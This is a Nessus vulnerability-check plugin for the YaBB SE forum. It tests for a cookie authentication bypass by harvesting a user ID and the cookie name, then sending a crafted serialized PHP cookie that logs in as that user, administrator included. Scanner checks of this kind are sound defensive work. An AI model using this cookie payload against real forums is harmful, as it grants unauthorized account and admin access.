#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(30054);
  script_version("$Revision: 1.5 $");

  script_bugtraq_id(27414);
  script_xref(name:"OSVDB", value:"50427");

  script_name(english:"YaBB SE Cookie Authentication Bypass");
  script_summary(english:"Tries to bypass authentication using a specially-crafted cookie");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that suffers from an
authentication bypass vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running YaBB SE, a web-based forum written in PHP. 

The version of YaBB SE installed on the remote host allows use of a
cookie to bypass authentication.  A remote attacker can leverage this
issue using a specially-crafted value for the cookie to gain access as
any user, including the administrator, which could in turn lead to
execution of arbitrary commands on the affected host, subject to the
privileges under which the web server operates." );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4963" );
 script_set_attribute(attribute:"solution", value:
"Use another product since YaBB SE is no longer supported." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq("/yabbse", "/forum", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Grab index.php.
  url = string(dir, "/index.php");
  res = http_get_cache(item:url, port:port);
  if (res == NULL) exit(0);

  # Identify a userid; fall back to "1" if not found.
  userid = NULL;
  username = NULL;

  pat = 'href="[^"]+\\?action=viewprofile;user=([^"]+)">';
  matches = egrep(pattern:pat, string:res);
  if (matches) 
  {
    foreach match (split(matches)) 
    {
      match = chomp(match);
      item = eregmatch(pattern:pat, string:match);
      if (!isnull(item))
      {
        username = item[1];
        break;
      }
    }
  }
  if (username)
  {
    r = http_send_recv3(method: "GET", 
      item:string(url, "?action=viewprofile;user=", username),
      port:port
    );
    if (isnull(r)) exit(0);

    pat = 'action="[^"]+\\?board=;action=usersrecentposts;userid=([0-9]+);user=';
    matches = egrep(pattern:pat, string:r[2]);
    if (matches) 
    {
      foreach match (split(matches)) 
      {
        match = chomp(match);
        item = eregmatch(pattern:pat, string:match);
        if (!isnull(item))
        {
          userid = item[1];
          break;
        }
      }
    }
  }
  if (isnull(userid)) userid = "1";

  # Now find the cookie name; fall back to "YaBBSE155" if not found.
  set_http_cookie(name: "PHPSESSID", value: "1");
  r = http_send_recv3(method: "GET", item:string(url, "?action=logout&sesc=1"), port:port);
  if (isnull(r)) exit(0);

  cookie = NULL;
  l = get_http_cookies_names(value_regex: "^deleted$", max_nb: 1);
  if (! isnull(l) && max_index(l) > 0)
   cookie = l[0];
  else
   cookie = "YaBBSE155";

  # Finally, try to exploit the issue to log in.
  exploit = string('a:2:{i:0;s:', strlen(userid), ':"', userid, '";i:1;b:1;}');
  set_http_cookie(name: cookie, value: urlencode(str:exploit));
  r = http_send_recv3(method: "GET", item:url, port:port);
  if (isnull(r)) exit(0);

  # There's a problem if we got in.
  if (";action=profile;" >< r[2])
  {
    security_hole(port);
    exit(0);
  }
}
